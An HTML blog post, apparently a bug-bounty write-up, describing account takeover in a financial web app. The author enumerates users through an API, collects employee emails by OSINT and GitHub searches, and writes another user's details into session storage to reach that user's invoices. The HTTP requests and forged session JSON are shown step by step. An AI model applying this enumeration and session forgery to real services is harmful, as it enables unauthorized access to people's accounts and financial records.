@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Takeover Through Manipulation of Session Storage — thevillagehacker</title>
+  <meta name="description" content="Account Takeover Through Manipulation of Session Storage"/>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../assets/css/style.css"/>
+</head>
+<body>
+<div class="page">
+
+  <!-- Navigation -->
+  <nav>
+    <a class="nav-logo" href="../index.html">thevillagehacker</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../about.html">Whoami</a></li>
+      <li><a href="../changelog.html">Changelog</a></li>
+    </ul>
+  </nav>
+
+  <!-- Post Header -->
+  <div class="post-header">
+    <div class="breadcrumb">
+      <a href="../blog.html">Blog</a><span>→</span>Account Takeover Through Manipulation of Session Storage
+    </div>
+    <h1 class="post-title">Account Takeover Through Manipulation of Session Storage</h1>
+    <div class="post-meta">
+      <span>2023-03-30</span>
+      <span>Naveen Jagadeesan</span>
+      <span>thevillagehacker</span>
+    </div>
+  </div>
+
+  <!-- Article Body -->
+  <article>
+<p>This blog explores the method of account takeover by manipulating the local session storage in a financial web application.</p>
+<h2>Target Background</h2>
+<p>The target of this analysis is a web application designed for financial purposes. It provides a comprehensive suite of features for generating, tracking, and reconciling invoices. Users can effectively manage payments and perform various financial activities within the application.</p>
+<h2>Overview</h2>
+<p>To evaluate the application's security, I created a test account through the signup functionality. After logging in, the application prompted me to create an organization, allowing access to team members and assigning them specific roles based on their responsibilities.</p>
+<h2>Reconnaissance</h2>
+<ul>
+<li>ReactJS framework</li>
+<li>Akamai Web Application Firewall (WAF)</li>
+<li>Relies on REST APIs</li>
+<li>Utilizes cookie-based authentication</li>
+</ul>
+<h2>User Enumeration</h2>
+<p>During the login process, after entering my username and password, the application sent a request to an API endpoint to verify if the user was part of the organization or if the user existed in the database.</p>
+<h3>Request</h3>
+<pre><code class="language-http">GET /api/v1/user?email=nj@tvhsecurity.com HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+</code></pre>
+<h3>Response</h3>
+<pre><code class="language-http">HTTP/1.1 200 OK 
+Date: Wed, 29 Mar 2023 05:59:48 GMT 
+X-Powered-By: Express 
+Access-Control-Allow-Origin: * 
+Content-Type: application/json; charset=utf-8 
+Content-Length: 370 
+ETag: W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; 
+Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
+X-Frame-Options: SAMEORIGIN 
+X-Content-Type-Options: nosniff 
+X-XSS-Protection: 1; mode=block 
+Referrer-Policy: strict-origin-when-cross-origin 
+Connection: close 
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+  &quot;status&quot;: true,
+  &quot;message&quot;: &quot;Successfully Retrieved&quot;,
+  &quot;result&quot;: [
+    {
+      &quot;UserId&quot;:601███,
+      &quot;EmailId&quot;: &quot;nj@tvhsecurity.com&quot;,
+      &quot;RegionId&quot;: 160,
+      &quot;RegionName&quot;: &quot;IN&quot;,
+      &quot;RoleId&quot;: 100,
+      &quot;RoleName&quot;: &quot;Admin&quot;,
+      &quot;CountryId&quot;: 26█,
+      &quot;CountryName&quot;: &quot;India&quot;,
+      &quot;Status&quot;: &quot;Approved&quot;,
+      &quot;Name&quot;: &quot;Naveen J&quot;,
+      &quot;DeliveryCentre&quot;: &quot;Bangalore, India&quot;,
+      &quot;IsActive&quot;: true,
+      &quot;SubProcess&quot;: &quot;null&quot;
+    }
+  ]
+}
+</code></pre>
+<h2>Post Login</h2>
+<p>After logging into the application, I explored the JavaScript files and local storage. I discovered that the session storage stored information retrieved from the user verification request response, preserving the user's details.</p>
+<p><img src="../assets/images/blogs/ATO/session_storage.png" alt="img" /></p>
+<h2>Theory</h2>
+<p>My initial theory aimed to test the session storage vulnerability as the application solely relied on encrypted cookies for authentication. To validate this theory, I needed another user account, so I created an additional test account.</p>
+<p>With two legitimate user accounts, I tested the theory that it would work if the application verified users based on the session storage key <strong>values</strong>.</p>
+<p>The screenshot below displays the session storage of the <strong>User1</strong> account.</p>
+<p><img src="../assets/images/blogs/ATO/Signed_up_user.png" alt="img" /></p>
+<p>I simply had to pass the email ID of the <strong>User2</strong> account in the email verification request to obtain the desired details for manipulation.</p>
+<pre><code class="language-http">GET /api/v1/user?email=nj+1@tvhsecurity.com HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+</code></pre>
+<p>I copied the required payload from the JSON response and modified the session value of the <strong>login</strong> key. Upon refreshing the page, I successfully logged into the <strong>User2</strong> account.</p>
+<h2>Notes:</h2>
+<ul>
+<li>User1 = nj@tvhsecurity.com</li>
+<li>User2 = nj+1@tvhsecurity.com</li>
+</ul>
+<p>Since both accounts were fresh and lacked real-world financial data, I was unable to definitively confirm the issue. To validate it, I needed to engage with the application's financial functionalities, which was not feasible at that time.</p>
+<p>Therefore, I decided to try the theory with a live account. To do so, I needed to enumerate the users within the application, which was relatively simple. I compiled a list of email IDs belonging to the target organization.</p>
+<h2>OSINT</h2>
+<p>I conducted OSINT reconnaissance on the target, searching for email IDs. While browsing through the organization's contact pages, I discovered some email IDs belonging to the company's business personnel. Unfortunately, none of them proved to be successful.</p>
+<h2>GitHub Recon</h2>
+<p>Next, I performed reconnaissance on GitHub using specific search queries and found a few email IDs in the issues section. Individuals from the organization had commented on issues related to their product/service repositories.</p>
+<p><img src="../assets/images/blogs/ATO/github.png" alt="img" /></p>
+<p>I compiled a list of these email IDs and submitted them to Intruder to check the content length. Fortunately, a few of them yielded positive results.</p>
+<h2>Verify User</h2>
+<h3>Request</h3>
+<pre><code class="language-http">GET /api/v1/user?email=ba████████@target.com HTTP/2
+Host: www.target.com
+Cookie: blah...blah...blah...
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.target.com/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: iframe
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Te: trailers
+</code></pre>
+<h3>Response</h3>
+<pre><code class="language-http">HTTP/1.1 200 OK 
+Date: Wed, 29 Mar 2023 05:59:48 GMT 
+X-Powered-By: Express 
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8 
+Content-Length: 370 
+ETag: W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; 
+Set-Cookie: ; Path=/; HttpOnly 
+X-Frame-Options: SAMEORIGIN 
+X-Content-Type-Options: nosniff 
+X-XSS-Protection: 1; mode=block 
+Referrer-Policy: strict-origin-when-cross-origin 
+Connection: close 
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+{
+  &quot;status&quot;: true,
+  &quot;message&quot;: &quot;Successfully Retrieved&quot;,
+  &quot;result&quot;: [
+    {
+      &quot;UserId&quot;: 10██,
+      &quot;EmailId&quot;: &quot;ba████████@target.com&quot;,
+      &quot;RegionId&quot;: [
+        300,
+        300
+      ],
+      &quot;RegionName&quot;: &quot;NA&quot;,
+      &quot;RoleId&quot;: 100,
+      &quot;RoleName&quot;: &quot;Admin&quot;,
+      &quot;CountryId&quot;: 200,
+      &quot;CountryName&quot;: &quot;United States&quot;,
+      &quot;Status&quot;: &quot;Approved&quot;,
+      &quot;Name&quot;: &quot;Bane Smith&quot;,
+      &quot;DeliveryCentre&quot;: &quot;New York, United States&quot;,
+      &quot;IsActive&quot;: true,
+      &quot;SubProcess&quot;: &quot;null&quot;
+    }
+  ]
+}
+</code></pre>
+<h2>Checkpoint</h2>
+<ul>
+<li>We have a valid user email</li>
+<li>Obtained the required details for session value manipulation</li>
+</ul>
+<h2>Extracted New Session Value</h2>
+<pre><code class="language-json">{
+  &quot;UserId&quot;: 10██,
+  &quot;EmailId&quot;: &quot;ba████████@target.com&quot;,
+  &quot;RegionId&quot;: 100,
+  &quot;RegionName&quot;: &quot;NA&quot;,
+  &quot;RoleId&quot;: 100,
+  &quot;RoleName&quot;: &quot;Admin&quot;,
+  &quot;CountryId&quot;: 200,
+  &quot;CountryName&quot;: &quot;United States&quot;,
+  &quot;Status&quot;: &quot;Approved&quot;,
+  &quot;Name&quot;: &quot;Bane Smith&quot;,
+  &quot;DeliveryCentre&quot;: &quot;New York, United States&quot;,
+  &quot;IsActive&quot;: true,
+  &quot;SubProcess&quot;: &quot;null&quot;
+}
+</code></pre>
+<p>The above value needs to be passed to the session storage to test the theory.</p>
+<h2>Exploitation</h2>
+<p>After successfully passing the extracted legitimate user's details in the session storage value and refreshing the page, the application granted me access to the user's account.</p>
+<p><img src="../assets/images/blogs/ATO/Exploitation.png" alt="exploit" /></p>
+<p>As depicted in the screenshot, I was able to view the invoices generated in the target user's account.</p>
+<p>Please note that due to non-disclosure agreements, the information shared is limited.</p>
+<p>Thank you for reading!</p>
+<p>For more updates and insights, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </article>
+
+  <!-- Post Navigation -->
+  <div class="post-nav">
+    <a href="2023-03-25-Hacking_MNCs-CMS_Systems.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">Exploiting Misconfigurations and Authorization Vulnerabilities in a Multinational Company's Content Management System</div></a>
+    <a href="2023-04-12-Business_logic_error.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Exploiting Business Logic Error: Price Manipulation</div></a>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <span class="footer-text">
+      © 2025 <a href="../index.html">thevillagehacker</a>
+      — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+      status: active<span class="blink"></span>
+    </span>
+  </footer>
+
+</div>
+</body>
+</html>
